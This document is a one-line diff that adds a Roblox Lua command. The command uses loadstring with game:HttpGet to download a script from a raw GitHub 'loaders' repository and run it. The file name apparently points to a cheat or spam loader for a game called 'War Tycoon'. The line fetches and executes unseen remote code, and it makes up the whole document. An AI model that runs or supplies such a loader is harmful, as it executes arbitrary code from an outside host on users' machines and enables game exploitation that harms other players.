@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/rework-war-tycoon-spam6-nd31w05dod3kte.lua"))()
